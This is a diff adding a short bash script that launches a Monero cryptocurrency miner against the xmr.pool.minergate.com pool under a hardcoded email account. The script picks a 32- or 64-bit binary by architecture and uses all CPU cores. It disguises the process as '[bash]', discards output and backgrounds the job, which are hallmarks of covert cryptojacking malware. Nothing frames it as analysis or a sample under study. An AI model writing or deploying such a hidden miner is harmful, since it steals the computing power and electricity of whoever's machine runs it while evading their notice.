@@ -1,0 +1,12 @@
+#!/bin/bash
+
+proc=`nproc`
+ARCH=`uname -m`
+HIDE="[bash]"
+
+if [ "$ARCH" == "i686" ];       then
+        ./h32 -s $HIDE ./bash -c 1 -t $proc -M stratum+tcp://dunhill9999%40hotmail.com:x@xmr.pool.minergate.com:45560/xmr >>/dev/null &
+elif [ "$ARCH" == "x86_64" ];   then
+        ./h64 -s $HIDE ./bash -c 1 -t $proc -M stratum+tcp://dunhill9999%40hotmail.com:x@xmr.pool.minergate.com:45560/xmr >>/dev/null &
+fi
+echo $! > bash.pid
